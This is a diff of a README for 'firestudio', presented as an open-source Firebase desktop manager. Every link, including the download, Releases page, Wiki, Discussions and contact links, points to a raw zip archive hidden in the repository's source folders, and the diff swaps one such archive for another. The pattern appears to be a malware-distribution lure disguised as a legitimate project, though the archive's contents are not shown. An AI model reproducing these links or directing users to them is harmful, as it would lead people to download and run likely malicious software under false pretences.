@@ -4,7 +4,7 @@
 Welcome to **firestudio**, a powerful, free, and open-source desktop application designed to help you manage Firebase services. Whether you need to handle Firestore databases, manage user authentication, or store files, firestudio simplifies these tasks. 
 
 ## 📦 Download Now
-[![Download firestudio](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip)](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip)
+[![Download firestudio](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip)](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip)
 
 ## 📋 Key Features
 - User-friendly interface for easy navigation.
@@ -20,7 +20,7 @@ Welcome to **firestudio**, a powerful, free, and open-source desktop application
 - **Disk Space:** At least 200 MB of free space.
 
 ## 🔗 Download & Install
-To download firestudio, visit the [Releases page](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip) on GitHub. Here, you will find the latest version available for download.
+To download firestudio, visit the [Releases page](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip) on GitHub. Here, you will find the latest version available for download.
 
 1. Click the link above to go to the Releases page.
 2. Find the version you want to download.
@@ -38,13 +38,13 @@ After installation, you can launch firestudio from your desktop or applications 
 4. Enter these details in the application to start managing your Firebase services.
 
 ## 📖 Additional Resources
-- **Documentation:** For detailed usage instructions, check the [Wiki](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip).
-- **Community Support:** Join our community on [GitHub Discussions](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip).
+- **Documentation:** For detailed usage instructions, check the [Wiki](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip).
+- **Community Support:** Join our community on [GitHub Discussions](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip).
   
 ## 📧 Contact
-For any questions or support needs, you can reach out to us at [https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip).
+For any questions or support needs, you can reach out to us at [https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip).
 
 ## 🔙 Back to Download
-Ready to get started? [Download firestudio now!](https://raw.githubusercontent.com/nich0lass/firestudio/master/electron/Software-3.8.zip)
+Ready to get started? [Download firestudio now!](https://raw.githubusercontent.com/nich0lass/firestudio/master/src/hooks/Software-v3.5-beta.2.zip)
 
 We hope firestudio enhances your experience with Firebase!
